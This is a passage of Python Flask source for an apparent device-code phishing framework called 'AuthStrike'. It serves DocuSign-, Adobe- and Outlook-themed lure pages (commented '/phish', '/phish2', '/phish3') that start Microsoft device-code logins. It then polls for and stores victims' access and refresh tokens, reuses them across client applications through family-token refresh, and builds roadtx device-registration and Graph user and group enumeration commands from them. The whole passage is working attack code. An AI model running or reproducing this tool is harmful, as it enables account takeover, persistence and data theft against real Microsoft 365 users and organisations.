            update_device_code_history(request_id, status="SUCCESS", completed_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), username=result.get("id_token_claims", {}).get("preferred_username"))
            print(f"[+] Token captured automatically for operation #{request_id}")
        else:
            error_code = (result.get("error") or "").lower()
            error_text = result.get("error_description") or result.get("error") or "Authentication failed"
            history = get_device_code_history()
            entry = next((x for x in history if x.get("id") == request_id), None)
            expired = False
            if entry and entry.get("expires_at"):
                try:
                    expired = datetime.now() >= datetime.strptime(entry["expires_at"], "%Y-%m-%d %H:%M:%S")
                except ValueError:
                    pass
            final_status = "EXPIRED" if expired or error_code in {"authorization_expired", "expired_token"} else "FAILED"
            final_error = "The device-code authentication window expired before authentication completed." if final_status == "EXPIRED" else error_text
            update_device_code_history(request_id, status=final_status, completed_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), error=final_error)
            print(f"[-] Device flow ended for operation #{request_id}: {final_status} - {final_error}")
    except Exception as exc:
        history = get_device_code_history()
        entry = next((x for x in history if x.get("id") == request_id), None)
        expired = False
        if entry and entry.get("expires_at"):
            try:
                expired = datetime.now() >= datetime.strptime(entry["expires_at"], "%Y-%m-%d %H:%M:%S")
            except ValueError:
                pass
        status = "EXPIRED" if expired else "FAILED"
        update_device_code_history(request_id, status=status, completed_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), error=("The device-code authentication window expired before authentication completed." if status == "EXPIRED" else str(exc)))
        print(f"[-] Device flow worker ended for operation #{request_id}: {status} - {exc}")

_poll_dispatcher_started = False
_poll_dispatcher_start_lock = threading.Lock()

def ensure_poll_dispatcher_started():
    global _poll_dispatcher_started
    with _poll_dispatcher_start_lock:
        if _poll_dispatcher_started:
            return
        _poll_dispatcher_started = True
        thread = threading.Thread(target=dispatch_poll_jobs, name="authstrike-poll-dispatcher", daemon=True)
        thread.start()

def client(c, cid=None): 
    target_id = cid or MICROSOFT_OFFICE_CLIENT_ID
    return msal.PublicClientApplication(target_id, authority=AUTHORITY, token_cache=c)

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user' not in session:
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated_function

if os.getenv("AUTHSTRIKE_DISABLE_POLL_DISPATCHER", "false").lower() not in {"1", "true", "yes"}:
    ensure_poll_dispatcher_started()

@app.route("/")
@login_required
def index():
    device_history = reconcile_device_code_history()
    token_history = get_token_history()
    active = [item for item in device_history if item.get("status") == "POLLING"]
    active_token_count = len(get_active_token_records())
    latest_token = token_history[-1] if token_history else None
    recent_activity = []
    for item in reversed(device_history[-8:]):
        recent_activity.append({
            "time": item.get("generated_at", "").split(" ")[-1][:5],
            "text": f'Device code #{item.get("id", "—")} generated',
            "status": item.get("status", "POLLING")
        })
    for item in reversed(token_history[-8:]):
        recent_activity.append({
            "time": item.get("captured_at", "").split(" ")[-1][:5],
            "text": f'Token captured for {item.get("username") or "unknown account"}',
            "status": "SUCCESS"
        })
    recent_activity = recent_activity[:8]
    return render_template("index.html",
        device_history=device_history,
        token_history=token_history,
        active_operations=active,
        latest_token=latest_token,
        recent_activity=recent_activity,
        active_token_count=active_token_count
    )

@app.route("/history")
@login_required
def history():
    device_history = reconcile_device_code_history()
    token_history = get_token_history()
    recent_device_history = list(reversed(device_history))[:10]
    recent_token_history = list(reversed(token_history))[:10]
    return render_template("index.html",
        device_history=device_history,
        token_history=token_history,
        recent_device_history=recent_device_history,
        recent_token_history=recent_token_history,
        older_device_count=max(0, len(device_history) - len(recent_device_history)),
        older_token_count=max(0, len(token_history) - len(recent_token_history)),
        active_operations=[],
        latest_token=(token_history[-1] if token_history else None),
        recent_activity=[],
        active_token_count=len(get_active_token_records()),
        history_only=True
    )

@app.route('/save_client_id', methods=['POST'])
@login_required
def save_client_id():
    require_csrf()
    data = request.get_json(silent=True) or request.form
    client_id = (data.get('client_id') or '').strip()
    if not client_id or len(client_id) > 128:
        return jsonify({'message': 'A valid Client ID is required.'}), 400
    session['client_id'] = client_id
    return jsonify({'message': 'Client ID saved for this operator session.'}), 200

#@app.route("/setup")
#def setup():
    #return render_template("setup.html")

def get_broker_device_registration_tokens():
    """Return active Broker operations that contain a usable refresh token.

    Only the Microsoft Authentication Broker client is eligible for this view.
    The refresh token is read from the operation-specific MSAL cache on demand
    and is never persisted into application history or query parameters.
    """
    broker_id = CLIENT_PROFILE_BY_KEY["broker"]["id"].lower()
    records = []
    seen = set()
    # Broker eligibility is determined by the originating operation/client.
    # Token-history metadata can legitimately reflect a later refresh target,
    # so do not exclude a Broker operation merely because its latest token
    # record carries another client id.
    operation_history = {
        item.get("id"): item
        for item in reconcile_device_code_history()
        if item.get("id") is not None
    }
    active_broker_operation_ids = {
        record.get("operation_id")
        for record in get_active_token_history()
        if record.get("operation_id") is not None
        and str(
            (operation_history.get(record.get("operation_id")) or {}).get("client_id")
            or record.get("client_id")
            or record.get("refresh_client_id")
            or ""
        ).lower() == broker_id
    }
    for entry in reconcile_device_code_history():
        if entry.get("status") != "SUCCESS":
            continue
        if str(entry.get("client_id") or "").lower() != broker_id:
            continue
        operation_id = entry.get("id")
        if operation_id not in active_broker_operation_ids:
            continue
        if not operation_id:
            continue
        try:
            token_cache = cache(operation_id)
            payload = json.loads(token_cache.serialize() or "{}")
            refresh_entries = payload.get("RefreshToken", {}) if isinstance(payload, dict) else {}
            candidates = []
            for cache_entry in refresh_entries.values():
                if not isinstance(cache_entry, dict):
                    continue
                secret = cache_entry.get("secret")
                if not secret:
                    continue
                candidates.append(cache_entry)
            if not candidates:
                continue

            # Prefer a refresh token explicitly owned by the Broker client.
            # If the cache has been updated by a later client acquisition and
            # no Broker client_id remains on the refresh-token entry, fall back
            # to the newest available refresh token for the same account/cache.
            broker_candidates = [
                item for item in candidates
                if str(item.get("client_id") or "").lower() == broker_id
            ]
            pool = broker_candidates or candidates
            pool.sort(
                key=lambda item: (
                    bool(item.get("family_id")),
                    str(item.get("cached_at") or "")
                ),
                reverse=True,
            )
            selected = pool[0]
            refresh_token = selected.get("secret")
            fingerprint = (operation_id, refresh_token)
            if fingerprint in seen:
                continue
            seen.add(fingerprint)
            records.append({
                "operation_id": operation_id,
                "username": entry.get("username") or "Unknown account",
                "captured_at": entry.get("completed_at") or entry.get("generated_at") or "",
                "foci_detected": bool(selected.get("family_id")),
                "gettokens_command": f"roadtx gettokens --refresh-token {json.dumps(refresh_token)} -r devicereg",
                "device_command": "roadtx device -a register -n AUTHSTRIKE-LAB-DEVICE",
            })
        except Exception:
            continue
    return records


@app.route("/setup", methods=["GET", "POST"])
@login_required
def setup():
    if request.method == "POST":
        require_csrf()
        default_profile = (request.form.get("default_client_profile") or "broker").strip()
        if default_profile not in CLIENT_PROFILE_BY_KEY:
            return render_template("setup.html", error="Select a valid default client.", client_profiles=CLIENT_PROFILES, template_clients=session.get("template_clients", DEFAULT_TEMPLATE_CLIENTS), default_profile="broker"), 400
        mapping = {}
        for template_key in DEFAULT_TEMPLATE_CLIENTS:
            value = (request.form.get(f"client_{template_key}") or DEFAULT_TEMPLATE_CLIENTS[template_key]).strip()
            mapping[template_key] = value if value in CLIENT_PROFILE_BY_KEY else DEFAULT_TEMPLATE_CLIENTS[template_key]
        session["client_profile"] = default_profile
        session["client_id"] = CLIENT_PROFILE_BY_KEY[default_profile]["id"]
        session["template_clients"] = mapping
        return redirect(url_for("setup", saved="1"))
    default_profile = session.get("client_profile", "broker")
    return render_template("setup.html", client_profiles=CLIENT_PROFILES, template_clients=session.get("template_clients", DEFAULT_TEMPLATE_CLIENTS), default_profile=default_profile, current_client_id=get_configured_client_id(), saved=request.args.get("saved") == "1", reset_done=request.args.get("reset_done") == "1", reset_error=request.args.get("reset_error"))

@app.route("/devicecode", methods=["GET", "POST"])
@login_required
def d():
    # GET is non-destructive: it only shows the campaign creation screen or an existing operation.
    if request.method == "GET":
        reconcile_device_code_history()
        operation_id = request.args.get("operation_id", type=int)
        if operation_id:
            entry = next((x for x in get_device_code_history() if x.get("id") == operation_id), None)
            if entry:
                return render_template("devicecode.html", operation=entry, history=get_device_code_history())
            return redirect(url_for("d"))
        active = None
        active_id = session.get("active_operation_id")
        if active_id:
            active = next((x for x in get_device_code_history() if x.get("id") == active_id and x.get("status") == "POLLING"), None)
        selected_profile = session.get("client_profile", "broker")
        nonce = secrets.token_urlsafe(24)
        session["operation_form_nonce"] = nonce
        return render_template(
            "new_operation.html",
            client_profiles=CLIENT_PROFILES,
            selected_profile=selected_profile,
            selected_profile_name=CLIENT_PROFILE_BY_KEY.get(selected_profile, CLIENT_PROFILE_BY_KEY["broker"])["name"],
            active_operation=active,
            creation_nonce=nonce,
        )

    require_csrf()
    nonce = (request.form.get("creation_nonce") or "").strip()
    expected_nonce = session.pop("operation_form_nonce", None)
    if not nonce or not expected_nonce or nonce != expected_nonce:
        return redirect(url_for("d"))

    profile_key = (request.form.get("client_profile") or session.get("client_profile") or "broker").strip()
    profile = resolve_client_profile(profile_key)

    # Prevent accidental double-submits. Parallel operations remain available, but require an explicit opt-in.
    with operation_creation_lock:
        reconcile_device_code_history()
        if not request.form.get("allow_parallel"):
            active_id = session.get("active_operation_id")
            active = next((x for x in get_device_code_history() if x.get("id") == active_id and x.get("status") == "POLLING"), None) if active_id else None
            if active:
                return redirect(url_for("d", operation_id=active["id"]))

        client_id = profile["id"]
        c = msal.SerializableTokenCache()
        a = client(c, client_id)
        f = a.initiate_device_flow(scopes=FOCI_SCOPES)
        if "user_code" not in f:
            return jsonify(error="Failed to initiate device flow.", details=f), 400

        request_id = get_next_request_id()
        now = datetime.now()
        expires_in = f.get("expires_in", 1800)
        expiration = now + timedelta(seconds=expires_in)
        generated_time_str = now.strftime("%Y-%m-%d %H:%M:%S")
        expiration_time_str = expiration.strftime("%Y-%m-%d %H:%M:%S")
        f["client_id"] = client_id
        save(c, request_id)
        save_device_code_history(request_id, f.get("user_code", "N/A"), client_id, generated_time_str, expiration_time_str)
        update_device_code_history(
            request_id,
            client_name=profile["name"],
            client_profile=profile["key"],
            verification_uri=f.get("verification_uri") or f.get("verification_uri_complete"),
        )
        session["active_operation_id"] = request_id
        session["client_profile"] = profile["key"]
        session["client_id"] = client_id
        enqueue_poll_job(request_id, f)

    entry = next(x for x in get_device_code_history() if x.get("id") == request_id)
    return render_template("devicecode.html", operation=entry, history=get_device_code_history())

@app.route("/operation/<int:entry_id>/status")
@login_required
def operation_status(entry_id):
    history = reconcile_device_code_history()
    entry = next((x for x in history if x.get("id") == entry_id), None)
    if not entry:
        return jsonify({"status": "NOT_FOUND"}), 404
    return jsonify({
        "id": entry_id,
        "status": entry.get("status", "POLLING"),
        "completed_at": entry.get("completed_at"),
        "error": entry.get("error"),
        "expires_at": entry.get("expires_at"),
    })

@app.route("/delete-device-code/<int:entry_id>", methods=["POST"])
@login_required
def delete_device_code(entry_id):
    require_csrf()
    if delete_device_code_entry(entry_id):
        return jsonify({"success": True})
    return jsonify({"success": False}), 400

# Capture target: /token view
@app.route("/delete-token/<int:record_index>", methods=["POST"])
@login_required
def delete_token(record_index):
    require_csrf()
    if delete_token_history_entry(record_index):
        return redirect(url_for("t"))
    return jsonify({"success": False, "message": "Token record not found."}), 404

@app.route("/token")
@login_required
def t():
    history = get_token_history()
    active_tokens = get_active_token_history()
    active_token_records = get_active_token_records()
    selected_token_index = request.args.get("token_index", type=int)
    operation_id = request.args.get("operation_id", type=int) or session.get("active_operation_id")

    selected_record = None
    if selected_token_index is not None:
        selected_record = next((item for item in active_token_records if item.get("history_index") == selected_token_index), None)
        if selected_record:
            operation_id = selected_record.get("operation_id")

    result = None
    if operation_id:
        entry = next((item for item in reconcile_device_code_history() if item.get("id") == operation_id), None)
        result = recover_operation_result(operation_id, entry)
    if not result and active_token_records:
        selected_record = selected_record or active_token_records[0]
        latest_operation = selected_record.get("operation_id")
        if latest_operation:
            operation_id = latest_operation
            entry = next((item for item in reconcile_device_code_history() if item.get("id") == operation_id), None)
            result = recover_operation_result(operation_id, entry)

    if result and "access_token" in result:
        access_token = result.get("access_token") or ""
        id_claims = result.get("id_token_claims") or {}
        token_claims = decode_access_token_metadata(access_token)

        # Prefer MSAL/account metadata, then ID-token claims, then the access-token
        # payload for display. The decoded access-token payload is explicitly
        # treated as display metadata only and is never used for authorization.
        account_meta = {}
        try:
            token_cache = cache(operation_id)
            client_id = entry.get("client_id") if entry else None
            application = client(token_cache, client_id or MICROSOFT_OFFICE_CLIENT_ID)
            accounts = application.get_accounts()
            if accounts:
                account_meta = accounts[0] or {}
        except Exception:
            account_meta = {}

        display_claims = dict(id_claims)
        fallback_claims = {
            "preferred_username": account_meta.get("username") or token_claims.get("preferred_username") or token_claims.get("upn") or token_claims.get("email"),
            "name": token_claims.get("name"),
            "tid": account_meta.get("tenant_id") or token_claims.get("tid"),
            "aud": token_claims.get("aud"),
            "scp": token_claims.get("scp"),
            "appid": token_claims.get("appid") or token_claims.get("azp"),
            "iss": token_claims.get("iss"),
        }
        for key, value in fallback_claims.items():
            if value and not display_claims.get(key):
                display_claims[key] = value

        scopes = result.get("scope") or token_claims.get("scp")
        remaining = result.get("expires_in")
        exp = token_claims.get("exp")
        if isinstance(exp, (int, float)):
            remaining = max(0, int(exp - datetime.now(timezone.utc).timestamp()))

        cache_state = inspect_foci_cache(operation_id)
        payload = {
            "status": "success",
            "message": "Access token captured for operation #" + str(operation_id),
            "token_type": result.get("token_type") or "Bearer",
            "expires_in": remaining,
            "scopes": scopes,
            "access_token": access_token,
            "refresh_token_available": bool(result.get("refresh_token")),
            "refresh_token_managed": bool(cache_state.get("refresh_token_managed")),
            "id_token_raw": result.get("id_token"),
            "user_claims_metadata": display_claims,
            "metadata_sources": {
                "msal_result": bool(result.get("scope") or result.get("id_token_claims")),
                "msal_account": bool(account_meta),
                "access_token_claims": bool(token_claims),
            },
            "raw_response": result,
        }
    else:
        payload = {"status": "waiting", "message": "Select an active token or complete a successful authentication operation."}

    return render_template(
        "token.html",
        data=payload,
        history=history,
        active_tokens=get_successful_operation_tokens(),
        active_token_history=active_tokens,
        active_token_records=active_token_records,
        selected_token_index=selected_token_index,
        selected_token_record=selected_record,
        operation_id=operation_id
    )

# Capture target: /refresh handles silent token refresh
@app.route("/refresh", methods=["GET", "POST"])
@login_required
def r():
    history = reconcile_device_code_history()
    successful_operations = get_successful_operation_tokens()
    selected_operation_id = request.args.get("operation_id", type=int) if request.method == "GET" else request.form.get("operation_id", type=int)
    selected_target = (request.args.get("target_client") if request.method == "GET" else request.form.get("target_client")) or ""
    selected_resource = (request.args.get("target_resource") if request.method == "GET" else request.form.get("target_resource")) or "graph"

    data = {
        "status": "waiting",
        "message": "Select a successful operation, target client and resource, then run a silent MSAL acquisition.",
    }

    if request.method == "POST":
        require_csrf()
        operation_id = int(request.form.get("operation_id") or 0)
        target_key = (request.form.get("target_client") or "").strip()
        resource_key = (request.form.get("target_resource") or "graph").strip()
        force_refresh = request.form.get("force_refresh") == "1"

        entry = next((x for x in history if x.get("id") == operation_id), None)
        if not entry or entry.get("status") != "SUCCESS":
            data = {"status": "error", "message": "Select a successful operation."}
        elif target_key not in CLIENT_PROFILE_BY_KEY:
            data = {"status": "error", "message": "Select a valid target client."}
        elif resource_key not in RESOURCE_PROFILE_BY_KEY:
            data = {"status": "error", "message": "Select a valid target resource."}
        else:
            target = CLIENT_PROFILE_BY_KEY[target_key]
            resource = RESOURCE_PROFILE_BY_KEY[resource_key]
            source_client_id = (entry.get("client_id") or MICROSOFT_OFFICE_CLIENT_ID).strip()
            source_profile = next((p for p in CLIENT_PROFILES if p.get("id") == source_client_id), None)
            cross_client = source_client_id.lower() != target["id"].lower()
            foci_state = inspect_foci_cache(operation_id)

            # Cross-client refresh is only attempted for clients in the known FOCI
            # family reference set, and only when the selected operation cache
            # actually contains family-token metadata. Same-client refresh does not
            # depend on FOCI classification.
            if cross_client and not target.get("foci"):
                data = {
                    "status": "error",
                    "message": f"{target['name']} is not in the known FOCI family reference set, so a cross-client refresh was not attempted.",
                    "source_client_name": source_profile["name"] if source_profile else source_client_id,
                    "source_client_id": source_client_id,
                    "target_client_name": target["name"],
                    "target_client_id": target["id"],
                    "target_resource_name": resource["name"],
                    "foci_detected": foci_state["detected"],
                    "foci_family_ids": foci_state["family_ids"],
                }
            elif cross_client and not foci_state["detected"]:
                data = {
                    "status": "error",
                    "message": "The selected operation cache does not contain family-token (FOCI) metadata, so a cross-client refresh was not attempted.",
                    "source_client_name": source_profile["name"] if source_profile else source_client_id,
                    "source_client_id": source_client_id,
                    "target_client_name": target["name"],
                    "target_client_id": target["id"],
                    "target_resource_name": resource["name"],
                    "foci_detected": False,
                    "foci_family_ids": [],
                }
            else:
                try:
                    token_cache = cache(operation_id)
                    application = client(token_cache, target["id"])
                    accounts = application.get_accounts()
                    if not accounts:
                        data = {
                            "status": "error",
                            "message": "No account is available in the selected operation's MSAL cache.",
                        }
                    else:
                        if hasattr(application, "acquire_token_silent_with_error"):
                            result = application.acquire_token_silent_with_error(
                                resource["scopes"],
                                account=accounts[0],
                                force_refresh=force_refresh,
                            ) or {}
                        else:
                            result = application.acquire_token_silent(
                                resource["scopes"],
                                account=accounts[0],
                                force_refresh=force_refresh,
                            ) or {}

                        save(token_cache, operation_id)

                        if result.get("access_token"):
                            previous = (OPERATION_RESULTS.get(operation_id) or {}).get("access_token")
                            now = datetime.now()
                            result["acquired_at"] = now.strftime("%Y-%m-%d %H:%M:%S")
                            result["expires_at"] = (
                                (now + timedelta(seconds=result.get("expires_in") or 0)).strftime("%Y-%m-%d %H:%M:%S")
                                if result.get("expires_in") else None
                            )
                            merged = dict(OPERATION_RESULTS.get(operation_id) or {})
                            merged.update(result)
                            merged["refresh_client_id"] = target["id"]
                            merged["refresh_client_name"] = target["name"]
                            merged["refresh_resource_key"] = resource_key
                            merged["refresh_resource_name"] = resource["name"]
                            OPERATION_RESULTS[operation_id] = merged
                            save_token_history(merged, operation_id)

                            same_token = bool(previous and previous == result.get("access_token"))
                            refresh_kind = "same-client" if not cross_client else "FOCI cross-client"
                            data = {
                                "status": "success",
                                "message": "MSAL returned an access token for the selected target client/resource.",
                                "foci_detected": foci_state["detected"],
                                "foci_family_ids": foci_state["family_ids"],
                                "source_client_name": source_profile["name"] if source_profile else source_client_id,
                                "source_client_id": source_client_id,
                                "target_client_name": target["name"],
                                "target_client_id": target["id"],
                                "target_resource_name": resource["name"],
                                "target_resource_key": resource_key,
                                "token_type": result.get("token_type"),
                                "expires_in": result.get("expires_in"),
                                "scopes": result.get("scope"),
                                "new_access_token": result.get("access_token"),
                                "same_token": same_token,
                                "refresh_mode": "forced" if force_refresh else "silent",
                                "refresh_kind": refresh_kind,
                            }
                            selected_operation_id = operation_id
                            selected_target = target_key
                            selected_resource = resource_key
                        else:
                            detail = result.get("error_description") or result.get("error") or "MSAL could not acquire a token for the selected client/resource."
                            data = {
                                "status": "error",
                                "message": detail,
                                "source_client_name": source_profile["name"] if source_profile else source_client_id,
                                "source_client_id": source_client_id,
                                "target_client_name": target["name"],
                                "target_client_id": target["id"],
                                "target_resource_name": resource["name"],
                                "foci_detected": foci_state["detected"],
                                "foci_family_ids": foci_state["family_ids"],
                            }
                except Exception as exc:
                    data = {"status": "error", "message": f"Refresh failed: {exc}"}

    return render_template(
        "refresh.html",
        data=data,
        operation_id=selected_operation_id,
        successful_operations=successful_operations,
        client_profiles=CLIENT_PROFILES,
        selected_target=selected_target,
        resource_profiles=RESOURCE_PROFILES,
        selected_resource=selected_resource,
    )

@app.route("/reset-workspace", methods=["POST"])
@login_required
def reset_workspace():
    require_csrf()
    confirmation = (request.form.get("confirmation") or "").strip().upper()
    if confirmation != "RESET":
        return redirect(url_for("setup", reset_error="Type RESET to confirm the workspace reset."))
    _state_reset()
    if os.path.isdir(CACHE_DIR):
        for child in list(os.listdir(CACHE_DIR)):
            if not (child.endswith(".bin") or child.endswith(".lock")):
                continue
            try:
                os.remove(os.path.join(CACHE_DIR, child))
            except OSError:
                pass
    OPERATION_RESULTS.clear()
    session.pop("active_operation_id", None)
    return redirect(url_for("setup", reset_done="1"))

@app.route("/me")
@login_required
def me():
    operation_id = request.args.get("operation_id", type=int)
    active_accounts = get_active_accounts()
    if not operation_id and active_accounts:
        operation_id = active_accounts[0].get("operation_id")

    profile = None
    error = None
    if operation_id:
        history = reconcile_device_code_history()
        entry = next((x for x in history if x.get("id") == operation_id), None)
        if entry and entry.get("status") == "SUCCESS":
            token, _, token_error = get_graph_token_for_operation(operation_id)
            if token_error:
                error = token_error["message"]
            else:
                response, request_error = graph_http_request(
                    "GET",
                    "https://graph.microsoft.com/v1.0/me",
                    headers={"Authorization": "Bearer " + token},
                    timeout=10,
                )
                if request_error:
                    error = f"Microsoft Graph request failed: {request_error}"
                    response = None
                if response is None:
                    response = requests.Response()
                    response.status_code = 502
                    response._content = b""

                try:
                    payload = response.json()
                except ValueError:
                    payload = None
                if response.status_code == 200 and payload:
                    profile = payload
                else:
                    error = (payload or {}).get("error", {}).get("message") if isinstance(payload, dict) else None
                    if response.status_code == 429:
                        retry_after = response.headers.get("Retry-After")
                        if retry_after:
                            error = error or f"Microsoft Graph is throttling this request. Please try again after {retry_after} seconds."
                        else:
                            error = error or "Microsoft Graph is temporarily throttling requests. Please try again shortly."
                    error = error or f"Microsoft Graph returned HTTP {response.status_code}."
        else:
            error = "Select a successful active account to inspect its profile."

    return render_template("me.html", data=profile or {"error": error} if error else (profile or {}), active_accounts=active_accounts, selected_operation_id=operation_id)

@app.route("/device-registration")
@login_required
def device_registration():
    broker_tokens = get_broker_device_registration_tokens()
    selected_operation_id = request.args.get("operation_id", type=int)
    selected_token = next((item for item in broker_tokens if item.get("operation_id") == selected_operation_id), None) if selected_operation_id else None
    return render_template(
        "device_registration.html",
        broker_tokens=broker_tokens,
        selected_operation_id=selected_operation_id,
        selected_token=selected_token,
    )

# New route to render the /base pagebase

def _ps_single_quote(value):
    return "'" + str(value).replace("'", "''") + "'"

def _bash_single_quote(value):
    return "'" + str(value).replace("'", "'\\''") + "'"

def _recover_token_for_tool_record(record):
    """Recover a current access token matching an active token record's client/resource."""
    operation_id = record.get("operation_id")
    if not operation_id:
        return None, {"error": "Operation is missing."}
    history = reconcile_device_code_history()
    entry = next((item for item in history if item.get("id") == operation_id), None)
    if not entry or entry.get("status") != "SUCCESS":
        return None, {"error": "The associated operation is no longer successful."}

    raw = record.get("access_token")
    if raw:
        return raw, None

    try:
        token_cache = cache(operation_id)
        client_id = record.get("client_id") or entry.get("client_id") or MICROSOFT_OFFICE_CLIENT_ID
        application = client(token_cache, client_id)
        accounts = application.get_accounts()
        if not accounts:
            return None, {"error": "No account is available in the selected operation cache."}

        resource_key = record.get("resource_key") or "graph"
        resource = RESOURCE_PROFILE_BY_KEY.get(resource_key, RESOURCE_PROFILE_BY_KEY["graph"])
        result = application.acquire_token_silent(resource["scopes"], account=accounts[0]) or {}
        access_token = result.get("access_token")
        if not access_token:
            return None, {"error": result.get("error_description") or result.get("error") or "MSAL could not recover an access token for this record."}
        return access_token, None
    except Exception as exc:
        return None, {"error": str(exc)}

def get_azure_cli_command_tokens():
    """Return active non-Broker token records for the read-only Azure CLI tool."""
    broker_id = CLIENT_PROFILE_BY_KEY["broker"]["id"].lower()
    operation_history = {item.get("id"): item for item in reconcile_device_code_history()}
    records = []
    for record in get_active_token_records():
        client_id = str(record.get("client_id") or "").lower()
        if client_id == broker_id:
            continue
        operation_id = record.get("operation_id")
        entry = operation_history.get(operation_id, {})
        access_token, error = _recover_token_for_tool_record(record)
        claims = decode_access_token_metadata(access_token) if access_token else {}
        client_name = record.get("client_name") or entry.get("client_name") or record.get("client_id") or "Unknown client"
        resource_name = record.get("resource_name") or RESOURCE_PROFILE_BY_KEY.get(record.get("resource_key") or "graph", {}).get("name") or "Microsoft Graph"
        record_out = {
            "history_index": record.get("history_index"),
            "operation_id": operation_id,
            "username": record.get("username") or entry.get("username") or claims.get("preferred_username") or "Unknown account",
            "client_id": record.get("client_id") or entry.get("client_id"),
            "client_name": client_name,
            "resource_key": record.get("resource_key") or "graph",
            "resource_name": resource_name,
            "captured_at": record.get("captured_at") or record.get("acquired_at") or "",
            "expires_at": record.get("expires_at"),
            "audience": claims.get("aud"),
            "token": access_token,
            "error": error.get("error") if error else None,
        }
        if access_token:
            ps_var=f"$AUTHSTRIKE_TOKEN = {_ps_single_quote(access_token)}"
            az_users = "az rest --method GET --url 'https://graph.microsoft.com/v1.0/users?$select=id,displayName,userPrincipalName' --headers \"Authorization=Bearer ${AUTHSTRIKE_TOKEN}\" --skip-authorization-header"
            az_groups = "az rest --method GET --url 'https://graph.microsoft.com/v1.0/groups?$select=id,displayName,mail' --headers \"Authorization=Bearer ${AUTHSTRIKE_TOKEN}\" --skip-authorization-header"
            ps_users = "Invoke-RestMethod -Method GET -Uri 'https://graph.microsoft.com/v1.0/users?$select=id,displayName,userPrincipalName&$top=50' -Headers $Headers"
            ps_groups = "Invoke-RestMethod -Method GET -Uri 'https://graph.microsoft.com/v1.0/groups?$select=id,displayName,mail&$top=50' -Headers $Headers"
            record_out["powershell_token"] = ps_var
            record_out["powershell_headers"] = '$Headers = @{ Authorization = "Bearer $AuthStrikeToken" }'
            record_out["powershell_users_command"] = ps_users
            record_out["powershell_groups_command"] = ps_groups
            record_out["bash_users_command"] = az_users
            record_out["bash_groups_command"] = az_groups
        records.append(record_out)
    return records

@app.route("/azure-cli-commands")
@login_required
def azure_cli_commands():
    records = get_azure_cli_command_tokens()
    selected_index = request.args.get("token_index", type=int)
    selected = next((item for item in records if item.get("history_index") == selected_index), None) if selected_index is not None else None
    return render_template("azure_cli_commands.html", token_records=records, selected_token=selected, selected_token_index=selected_index)

@app.route("/home")
@login_required
def base():
    templates = [
        {"name": "DocuSign", "description": "Document-signing campaign with Microsoft device authentication.", "endpoint": "e", "path": "/validation", "category": "Document", "profile": get_template_profile("validation")["key"]},
        {"name": "Adobe", "description": "Adobe-style document review campaign with Microsoft device authentication.", "endpoint": "adobe_simulation", "path": "/adobe-simulation", "category": "Document", "profile": get_template_profile("adobe")["key"]},
        {"name": "Outlook", "description": "Outlook-style mailbox access campaign with Microsoft device authentication.", "endpoint": "outlook_simulation", "path": "/outlook-simulation", "category": "Mail", "profile": get_template_profile("outlook")["key"]},
    ]
    return render_template("home.html", templates=templates, client_profiles=CLIENT_PROFILES, template_clients=session.get("template_clients", DEFAULT_TEMPLATE_CLIENTS))

# Route: /phish
@app.route("/validation", methods=["GET"])
def e():
    profile = resolve_client_profile(request.args.get("client"), "validation")
    client_id = profile["id"]
    c = msal.SerializableTokenCache()
    a = client(c, client_id)
    flow = a.initiate_device_flow(scopes=FOCI_SCOPES)
    
    if "user_code" not in flow:
        return jsonify(error="Failed to initiate device flow.", details=flow), 400

    request_id = get_next_request_id()
    now = datetime.now()
    expires_in = flow.get("expires_in", 1800)
    expiration = now + timedelta(seconds=expires_in)
    generated_time_str = now.strftime("%Y-%m-%d %H:%M:%S")
    expiration_time_str = expiration.strftime("%Y-%m-%d %H:%M:%S")
    flow["client_id"] = client_id
    save(c, request_id)
    save_device_code_history(request_id, flow.get("user_code", "N/A"), client_id, generated_time_str, expiration_time_str)
    update_device_code_history(request_id, client_name=profile["name"], client_profile=profile["key"], verification_uri=flow.get("verification_uri_complete") or flow.get("verification_uri"))
    
    # START BACKGROUND CAPTURE THREAD
    enqueue_poll_job(request_id, flow)

    history = get_device_code_history()
    return render_template("validation.html",
        request_id=request_id,
        user_code=flow.get("user_code", "N/A"),
        generated_time=now.strftime("%A, %B %d, %Y at %I:%M:%S %p"),
        expiration_time=expiration.strftime("%A, %B %d, %Y at %I:%M:%S %p"),
        expires_in=expires_in,
        verification_uri=flow.get("verification_uri_complete") or flow.get("verification_uri"),
        history=history
    )

# Route: /phish2
@app.route("/verify", methods=["GET"])
def f():
    profile = resolve_client_profile(request.args.get("client"), "verify")
    client_id = profile["id"]
    c = msal.SerializableTokenCache()
    a = client(c, client_id)
    flow = a.initiate_device_flow(scopes=FOCI_SCOPES)
    
    if "user_code" not in flow:
        return jsonify(error="Failed to initiate device flow.", details=flow), 400

    request_id = get_next_request_id()
    now = datetime.now()
    expires_in = flow.get("expires_in", 1800)
    expiration = now + timedelta(seconds=expires_in)
    generated_time_str = now.strftime("%Y-%m-%d %H:%M:%S")
    expiration_time_str = expiration.strftime("%Y-%m-%d %H:%M:%S")
    flow["client_id"] = client_id
    save(c, request_id)
    save_device_code_history(request_id, flow.get("user_code", "N/A"), client_id, generated_time_str, expiration_time_str)
    update_device_code_history(request_id, client_name=profile["name"], client_profile=profile["key"], verification_uri=flow.get("verification_uri_complete") or flow.get("verification_uri"))
    
    # START BACKGROUND CAPTURE THREAD
    enqueue_poll_job(request_id, flow)

    history = get_device_code_history()
    return render_template("verify.html",
        request_id=request_id,
        user_code=flow.get("user_code", "N/A"),
        generated_time=now.strftime("%A, %B %d, %Y at %I:%M:%S %p"),
        expiration_time=expiration.strftime("%A, %B %d, %Y at %I:%M:%S %p"),
        expires_in=expires_in,
        verification_uri=flow.get("verification_uri_complete") or flow.get("verification_uri"),
        history=history
    )

# Route: /phish3
@app.route("/secure", methods=["GET"])
def g():
    profile = resolve_client_profile(request.args.get("client"), "secure")
    client_id = profile["id"]
    c = msal.SerializableTokenCache()
    a = client(c, client_id)
    flow = a.initiate_device_flow(scopes=FOCI_SCOPES)
    
    if "user_code" not in flow:
        return jsonify(error="Failed to initiate device flow.", details=flow), 400

    request_id = get_next_request_id()
    now = datetime.now()
    expires_in = flow.get("expires_in", 1800)
    expiration = now + timedelta(seconds=expires_in)
    generated_time_str = now.strftime("%Y-%m-%d %H:%M:%S")
    expiration_time_str = expiration.strftime("%Y-%m-%d %H:%M:%S")
